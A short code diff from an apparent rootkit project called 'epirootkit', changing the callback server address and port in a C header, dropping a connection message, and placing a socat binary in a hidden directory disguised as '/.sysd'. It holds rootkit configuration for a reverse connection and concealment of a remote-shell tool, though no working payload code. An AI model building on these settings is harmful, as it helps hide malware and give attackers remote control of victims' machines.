@@ -23,9 +23,8 @@
 #endif
 
 // PARAMETERS MACROS
-#define SERVER_IP "192.168.100.1" // TO ADAPT
+#define SERVER_IP "192.168.100.2"
 #define SERVER_PORT 4242
-#define CONNEXION_MESSAGE "epirootkit: connexion established\n"
 
 // SOCAT MACROS
 #define SOCAT_BINARY_PATH HIDDEN_DIR_PATH "/.sysd"
